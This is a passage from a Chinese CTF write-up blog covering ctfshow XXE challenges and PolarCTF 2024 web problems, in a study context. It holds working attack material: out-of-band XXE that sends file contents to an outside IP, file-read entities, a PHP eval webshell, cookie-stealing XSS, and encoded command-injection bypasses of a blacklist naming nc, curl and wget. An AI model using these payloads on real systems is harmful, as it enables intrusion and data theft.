&#x27;http://localhost:88/?content=%file;&#x27;&gt;&quot;&gt; %payload;<br></code></pre></td></tr></table></figure><h4 id="加载本地DTD"><a href="#加载本地DTD" class="headerlink" title="加载本地DTD"></a>加载本地DTD</h4><p>这种在刷题的时候不太常见，可以参考上面的参考文章使用。</p><h2 id="四、靶机演练"><a href="#四、靶机演练" class="headerlink" title="四、靶机演练"></a>四、靶机演练</h2><h3 id="1-ctfshow-web373"><a href="#1-ctfshow-web373" class="headerlink" title="1.ctfshow web373"></a>1.ctfshow web373</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <br><br></code></pre></td></tr></table></figure><p>代码大题的意思是读取xml，然后在xml文件中提取ctfshow标签中的内容，随后进行echo</p><p>直接尝试构造就行，有回显的还是挺简单的。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ctfshow</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/web373.png" alt="web373"></p><h3 id="2-ctfshow-web374"><a href="#2-ctfshow-web374" class="headerlink" title="2.ctfshow web374"></a>2.ctfshow web374</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <br><br></code></pre></td></tr></table></figure><p>和第一个比较起来，第二个无回显。这个时候需要vps将内容带出来。</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hacker</span>[</span></span><br><span class="hljs-meta"><span class="language-xml">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span> </span></span><br><span class="hljs-meta"><span class="language-xml">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtds</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps:8888/test.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">    %dtds;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span>    </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">1</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p>然后在服务器上传test.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; showflag SYSTEM &#x27;http://8.130.42.113:5566/%file;&#x27;&gt;&quot;&gt;<br>&lt;!--test.dtd的内容，内部的%号要进行实体编码成&amp;#x25;  相当于% showflag--&gt;<br>%dtd;<br>%showflag;<br><br></code></pre></td></tr></table></figure><p>先用python开端口监听</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/374-1.png" alt="374-1"></p><p>然后再开端口接收内容</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/374-2.png" alt="374-2"></p><p>最后base解密就可以了</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/374-3.png" alt="374-3"></p><p>流程:首先在burpsuite的repeated页面构造最上面的payload，利用参数实体，调用%dtds,获得服务器上的test.dtd,再到dtd中的%dtd中的%showflag,这里注意%需要进行实体编码&amp;#x25，把内容带出到我们开的端口上面，最后得到flag。</p><p>ps:我本地没有配置web服务，所以需要开个http服务，如果有配置的话不需要一些步骤，可以参考其他师傅的wp了解一下。</p><h3 id="3-ctfshow-web375"><a href="#3-ctfshow-web375" class="headerlink" title="3.ctfshow web375"></a>3.ctfshow web375</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2021-01-07 12:59:52<br># @Last Modified by:   h1xa<br># @Last Modified time: 2021-01-07 15:22:05<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>libxml_disable_entity_loader(false);<br>$xmlfile = file_get_contents(&#x27;php://input&#x27;);<br>if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;, $xmlfile))&#123;<br>    die(&#x27;error&#x27;);<br>&#125;<br>if(isset($xmlfile))&#123;<br>    $dom = new DOMDocument();<br>    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br>highlight_file(__FILE__);    <br><br><br></code></pre></td></tr></table></figure><p>这题和374其实差不多，多了一层验证，判断是否有 ?xml version&#x3D;”1.0”,如果有就会爆error</p><p>和374流程几乎完全一样只是绕过一下，有两种方法</p><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一:"></a>方法一:</h4><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/375-1.png" alt="375-1"></p><p>直接去掉就行，会默认是xml文本</p><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二:"></a>方法二:</h4><p>这里的判断是对整体的判断，中间多加一个空格就可以进行绕过</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml  version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br></code></pre></td></tr></table></figure><p>其他同374进行</p><h3 id="4-ctfshow-web376"><a href="#4-ctfshow-web376" class="headerlink" title="4.ctfshow web376"></a>4.ctfshow web376</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2021-01-07 12:59:52<br># @Last Modified by:   h1xa<br># @Last Modified time: 2021-01-07 15:23:51<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>libxml_disable_entity_loader(false);<br>$xmlfile = file_get_contents(&#x27;php://input&#x27;);<br>if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;, $xmlfile))&#123;<br>    die(&#x27;error&#x27;);<br>&#125;<br>if(isset($xmlfile))&#123;<br>    $dom = new DOMDocument();<br>    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br>highlight_file(__FILE__);    <br><br></code></pre></td></tr></table></figure><p>这题比上面多了一层大小写判断，基本没有影响</p><p>就用上面的方法就行</p><p>这里的双引号也可以用单引号进行绕过，不多赘叙</p><h3 id="5-ctfshow-web377"><a href="#5-ctfshow-web377" class="headerlink" title="5.ctfshow web377"></a>5.ctfshow web377</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2021-01-07 12:59:52<br># @Last Modified by:   h1xa<br># @Last Modified time: 2021-01-07 15:26:55<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>libxml_disable_entity_loader(false);<br>$xmlfile = file_get_contents(&#x27;php://input&#x27;);<br>if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;, $xmlfile))&#123;<br>    die(&#x27;error&#x27;);<br>&#125;<br>if(isset($xmlfile))&#123;<br>    $dom = new DOMDocument();<br>    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br>highlight_file(__FILE__);    <br><br><br></code></pre></td></tr></table></figure><p>这题比上层多了http的绕过，这题看了师傅的绕法</p><p>正常使用的是utf-8，我们可以编码为utf-16或者utf-32来进行python发包</p><p>直接上payload，这些题目基本是一样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&#x27;http://0197db2a-c2a9-49f9-8823-3868d3a6ae77.challenge.ctf.show/&#x27;</span><br>payload=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;!DOCTYPE hacker[    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="hljs-string">    &lt;!ENTITY % dtds SYSTEM &quot;http://vps:8888/test.dtd&quot;&gt;</span><br><span class="hljs-string">    %dtds;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;root&gt;</span><br><span class="hljs-string">1</span><br><span class="hljs-string">&lt;/root&gt;&quot;&quot;&quot;</span><br>payload=payload.encode(<span class="hljs-string">&#x27;utf-16&#x27;</span>)<br><span class="hljs-built_in">print</span>(requests.post(url,data=payload).text)<br></code></pre></td></tr></table></figure><h3 id="6-ctfshow-web378"><a href="#6-ctfshow-web378" class="headerlink" title="6.ctfshow web378"></a>6.ctfshow web378</h3><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/378.png" alt="378"></p><p>f12看看源码定位到了一行</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">contentType:</span> <span class="hljs-string">&quot;application/xml;charset=utf-8&quot;</span><br></code></pre></td></tr></table></figure><p>那就是xxe无回显的题目了</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/378-1.png" alt="378-1"></p><p>简单分析一下，url&#x2F;doLogin下面进行xxe利用，得到flag,构造username和password</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/378-2.png" alt="378-2"></p><p>得到flag</p><p>还有的例题可以参照我的litctf2024和polarctf2024夏，分别有道考察xxe方面的题目</p><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>以上是我对xxe的浅层次的学习，虽然题目都不算太难，但也算能入个门了，暂时就到这了。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xxe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Polarctf2024夏</title>
    <link href="/2024/06/09/polarctf/PolarCTF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A82024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2024/06/09/polarctf/PolarCTF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A82024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>前言:比赛并没有参加，趁着复习期末写题目放松一会，学习学习知识。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p>典型的一句话木马，按照流程来就行</p><p>直接上传一个图片，不能直接连接成功，试着传入htaccess限定只能上传图片那些，那估计就是改图片为php就行</p><p><img src="/../../images/polarctf2024%E5%A4%8F/upload.png" alt="upload"></p><p>然后蚁剑连一下就可以了</p><p><img src="/../../images/polarctf2024%E5%A4%8F/upload1.png" alt="upload1"></p><p>疑惑：我尝试用jpg上传的时候改末尾并不能成功，看官p用的gif，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;attack&#x27;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>按道理也应该正常执行的，并不是很理解。</p><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">no no no! &lt;?php<br>error_reporting(0);<br>include(&quot;flag.php&quot;);<br>highlight_file(__FILE__);<br><br>if (isset($_GET[&#x27;xxs&#x27;])) &#123;<br>    $input = $_GET[&#x27;xxs&#x27;];<br><br>    if (is_array($input)) &#123;<br>        die(&quot;错误：输入类型不允许为数组。&quot;);<br>    &#125;<br>    if (!preg_match(&quot;/^0e[0-9]+$/&quot;, md5($input))) &#123;<br>        die(&quot;错误：输入的MD5值必须以&#x27;0e&#x27;开头，并跟随数字。&quot;);<br>    &#125;<br>    if (!is_numeric($input)) &#123;<br>        die(&quot;错误：输入必须是数字。&quot;);<br>    &#125;<br><br>    die(&quot;恭喜：&quot;.$flag);<br>&#125; else &#123;<br>    die(&quot;错误：必须设置正确参数。&quot;);<br>&#125;<br>?&gt;<br>错误：必须设置正确参数。<br></code></pre></td></tr></table></figure><p>先上源码，先审计一下代码，大体上应该就是关于md5的知识点</p><p>首先不能用数组绕过，然后要0e开头，最后md5加密后不能为数字，直接一把梭了，平时积累的md5加密等于自身就行</p><p><img src="/../../images/polarctf2024%E5%A4%8F/%E5%AE%A1%E8%AE%A1.png" alt="审计"></p><h2 id="扫扫看"><a href="#扫扫看" class="headerlink" title="扫扫看"></a>扫扫看</h2><p>提醒我们扫一下，用dirsearch扫一下得到flag.php,进去看看</p><p><img src="/../../images/polarctf2024%E5%A4%8F/%E6%89%AB.png" alt="扫"></p><p>看一下源码,得到flag</p><p><img src="/../../images/polarctf2024%E5%A4%8F/%E6%89%AB1.png" alt="扫1"></p><h2 id="debudao"><a href="#debudao" class="headerlink" title="debudao"></a>debudao</h2><p>内容，先看看源码，有个flag是假的（欸</p><p>尝试sql注入，好像也不是</p><p>尝试ssit注入，也不是</p><p>最后发现是xxe漏洞，这方面我还没怎么学，等暑假好好补补吧</p><p>先用下面的来测试一下，发现有弹窗</p><p><img src="/../../images/polarctf2024%E5%A4%8F/debudao.png" alt="debudao"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;alert(1)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>然后跟着wp写的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="/../../images/polarctf2024%E5%A4%8F/%E5%BE%97%E4%B8%8D%E5%88%B01.png" alt="得不到1"></p><p>爆出flag，用url解码就可以得到flag了</p><p>想法：按照这个方法的话其实好像可以直接用hackerbar看cookie那一栏，并不需要构造xxe，重新开一次容器发现方法并不可行，哈哈我自己想多了</p><h2 id="Dragon"><a href="#Dragon" class="headerlink" title="Dragon"></a>Dragon</h2><p>按照正常思路来走一遍，和上面的差不多但是都没有回显，最后得出也是xxe</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>也是用这个得到的但是不能正常弹窗，和官p学习了一下可以用img</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;img src=0 onerror =alert(1)&gt;<br></code></pre></td></tr></table></figure><p>这样就可以正常的弹窗了，然后和上面的题目一样</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;img src=0 onerror =alert(document.cookie)&gt;<br></code></pre></td></tr></table></figure><p>获取cookie值，url解码得到flag</p><p>感想:任何比赛都能让人找到自己的不足漏洞，之后一定要狠狠学学。</p><h2 id="tnl"><a href="#tnl" class="headerlink" title="tnl"></a>tnl</h2><p>类型和前几题差不多，也试看看，尝试输入到3的时候会有报错，以为是sql注入，尝试万能语句并没有作用</p><p>也尝试了一下xxe也没有回显</p><p>用bp抓包看看，尝试利用伪协议得到index.php</p><p><img src="/../../images/polarctf2024%E5%A4%8F/tnl.png" alt="tnl"></p><p>这是尝试过后发现源码应该后面本身就包含了.php，得到了源码，base64解密一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;/form&gt;<br>&lt;?php<br>error_reporting(0);<br>@$file = $_POST[&#x27;twothree&#x27;];<br><br>if(isset($file))<br>&#123;<br>if( strpos( $file, &quot;1&quot; ) !==  false || strpos( $file, &quot;2&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;<br>include ($file . &#x27;.php&#x27;);<br>&#125;<br>else&#123;<br>echo &quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;twothree&#x27;&#x27; at line 1&quot;;<br>&#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>看了源码可以得知这并不是sql注入，而是一个伪协议绕过的题目，输入1，2，index可以获得相应的内容</p><p>那么进行简单的构造，我也是第一次看到这种</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">twothree=php://filter/convert.base64-encode/index/resource=flag<br></code></pre></td></tr></table></figure><p><img src="/../../images/polarctf2024%E5%A4%8F/tnl1.png" alt="tnl1"></p><p>最后base64解密就可以得到flag了</p><h2 id="你知道sys还能这样玩吗"><a href="#你知道sys还能这样玩吗" class="headerlink" title="你知道sys还能这样玩吗"></a>你知道sys还能这样玩吗</h2><p>根据提示进入sys.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget/i&#x27;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>和国赛的那个有点类似</p><h3 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h3><p>尝试php -r来进行二次执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=php -r <span class="hljs-string">&#x27;system(hex2bin(&quot;6c73202e2e2f&quot;));&#x27;</span><br></code></pre></td></tr></table></figure><p>查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=php -r <span class="hljs-string">&#x27;system(hex2bin(ff3b636174202f666c61672e747874));&#x27;</span><br></code></pre></td></tr></table></figure><p>ff是进行的一个绕过执行，否则得不到</p><h3 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=`<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;Y2F0IC8q&quot;</span>|bas<span class="hljs-string">&quot;&quot;</span>e64 -d`<br></code></pre></td></tr></table></figure><p>这里看到一个师傅利用了printf和双引号绕过base64加密的方法得到了答案，也放在这，还是比较巧妙的</p><h3 id="方法3："><a href="#方法3：" class="headerlink" title="方法3："></a>方法3：</h3><p>上面几个都是借鉴的，还有一个办法就是八进制转化，之前写xyctf有一个和这样类似的，我就直接上payload了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=$%27\143\141\164%27%3c$%27\57\146\154\141\147\56\164\170\164%27<br></code></pre></td></tr></table></figure><p>详情可参考，<a href="https://0ran9ewww.github.io/2024/04/26/XYCTFwp%E5%8F%8A%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%9B%98/">文章</a>，ezrce那个部分</p><h2 id="ExX"><a href="#ExX" class="headerlink" title="ExX?"></a>ExX?</h2><p>先搜看看flag{}有个假的flag，那再看看题目吧</p><p>尝试dirsearch扫描得到dom.php,出现了xml的报错很明显就是xxe的漏洞了，同天的lit比赛也是有一个题目是xxe</p><p>不知道原理直接上payload之后打算写一篇专题好好学习</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span 